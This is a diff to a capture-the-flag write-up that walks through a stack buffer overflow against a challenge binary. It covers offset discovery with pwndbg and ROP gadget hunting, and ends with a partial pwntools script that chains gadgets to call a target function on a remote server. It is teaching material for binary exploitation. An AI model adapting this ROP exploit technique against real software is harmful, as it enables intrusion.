@@ -32,77 +32,95 @@ What we need to find:
 2. Return address of `treasureChest` function
 3. Gadgets required for the function arguments
 
-#### To find the offset needed:
-1. use `cyclic 100` in pwndbg (this generates the de bruijn sequence)
-2. `run`
-3. you should see that the `RSP` pointer contains `jaaaaaaa` and beyond. We just need the first 8 bytes because that is where the return address is.
+### To find the offset needed:
+1. Open program with pwndbg
+```shell
+$> gdb chall
+```
 
+2. Generate the cyclic pattern of 200 bytes. This cyclic sequence helps uses to identify what address or how many bytes we want to overwrite.
+```shell
+pwndbg> cyclic 100
+aaaaaaaabaaaaaaacaaaa...
+```
+
+3. Run the program and paste when prompted
+```shell
+pwndbg> run
+``` 
+
+4. You should be able to observe this in the registers:
+```shell
+ RBP  0x6161616161616169 ('iaaaaaaa')
+ RSP  0x7fffffffdc68 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqa...
+```
+
+5. Let's find our offset:
 ```shell
 pwndbg> cyclic -l jaaaaaaa
 Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
 Found at offset 72
 ```
 
-#### To find `treasureChest` function address:
+### To find `treasureChest` function address:
 ```sh
 $> objdump -d chall | grep treasureChest
-0000000000400727 <treasureChest>:
+0000000000400797 <treasureChest>:
 ...
 ```
 
-#### To find gadgets
+### To find gadgets
 For `rdi` register:
 ```sh
 $> ROPgadget --binary chall | grep "pop rdi"
-0x00000000004008c3 : pop rdi ; ret
+0x0000000000400963 : pop rdi ; ret
 ```
 
 For `rsi` register:
 ```sh
 $> ROPgadget --binary chall | grep "pop rsi"
-0x00000000004008c1 : pop rsi ; pop r15 ; ret
+0x0000000000400961 : pop rsi ; pop r15 ; ret
 ```
 
 For `rdx` register:
 ```sh
 $> ROPgadget --binary chall | grep ": pop rdx"
-0x00000000004007f7 : pop rdx ; ret
+0x0000000000400867 : pop rdx ; ret
 ```
 
 We can see that the `rsi` gadget has `pop r15` as well. We do not need this for the exploit but we have to fill it up with a redundant value so that it does not affect our ROP chain.
 
-#### Assembling our exploit
+### Assembling our exploit
 Before we return to the `treasureChest` function, we want to prepare the registers first so that the function will take argument values from the registers accordingly. Our payload will then look something like this:
 
 1. padding
 2. pop rdi address + key1 (0x13371337)
 3. pop rsi address + key2 (0xdeadbeef) + redundent value (0)
 4. pop rdx address + key3 (0xcoff33)
-5. return address of `treasureChest` fcuntioon
+5. return address of `treasureChest` function
 
-#### Final solution
+### Final solution
 ```py
 from pwn import *
 
 # setup process
-p = process("./chall")
-context.binary = "./chall"
+p = remote("SERVER", PORT)
 
 # ROP gadgets
-pop_rdi = 0x4008c3 # pop rdi
-pop_rsi = 0x4008c1 # pop rsi, pop r15
-pop_rdx = 0x4007f7 # pop rdx 
+pop_rdi = 0x400963 # pop rdi
+pop_rsi = 0x400961 # pop rsi, pop r15
+pop_rdx = 0x400867 # pop rdx 
 
 # address of treasureChest 
-win = 0x400727
+win = 0x400797
 
-# offer
+# offset
 payload = b'A' * 72
 
 # ---------------------- ROP chain ---------------------------
 # pop rdi + key1
 # pop rsi + key2 + 0 (no need for r15)
-# pop rdx
+# pop rdx + key3
 # address of treasureChest
 payload += p64(pop_rdi) + p64(0x13371337)
 payload += p64(pop_rsi) + p64(0xdeadbeef) + p64(0)
